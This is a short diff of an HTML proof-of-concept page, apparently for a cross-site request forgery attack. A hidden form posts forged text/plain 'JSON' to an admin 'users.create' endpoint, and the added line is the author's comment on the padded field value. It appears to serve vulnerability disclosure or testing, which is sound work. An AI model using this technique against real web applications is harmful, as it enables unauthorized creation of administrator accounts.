@@ -2,6 +2,7 @@
   <body>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
       <form id="myform" enctype="text/plain" action="http://IP/admin/?object=users.create" method="POST">
+<--- The server communicates using JSON requests. For some unclear reason, my POC generated a broken JSON and also added an equal sign at the end. This is why the places with value='"}' may seem strange --->
         <input id="json" type="hidden" name='json' value='"}'>
       </form>
     <script>
